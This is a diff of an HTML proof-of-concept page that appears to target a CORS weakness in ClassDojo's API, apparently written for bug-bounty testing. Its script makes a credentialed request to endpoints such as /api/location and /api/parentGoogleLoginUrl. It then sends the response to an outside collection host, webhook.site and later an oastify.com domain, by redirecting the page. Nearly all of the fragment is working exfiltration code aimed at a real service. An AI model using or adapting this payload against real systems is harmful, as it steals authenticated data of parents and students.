@@ -10,13 +10,13 @@
     <script>
         var req = new XMLHttpRequest(); 
         req.onload = reqListener; 
-        req.open('GET', 'https://home.classdojo.com/api/location', true); 
+        req.open('GET', 'https://home.classdojo.com/api/parentGoogleLoginUrl', true); 
         req.withCredentials = true; // Send cookies with the request
         req.send();
 
         function reqListener() {
             // Send the response to your Webhook.site for logging
-            location = 'https://webhook.site/77be87a4-2b5c-4a85-a81b-cec771bd6a73?key=' + encodeURIComponent(this.responseText);
+            location = 'http://u729ii7a7bb4ihy856wmhvpbf2lt9kx9.oastify.com?key=' + encodeURIComponent(this.responseText);
         };
     </script>
 </body>
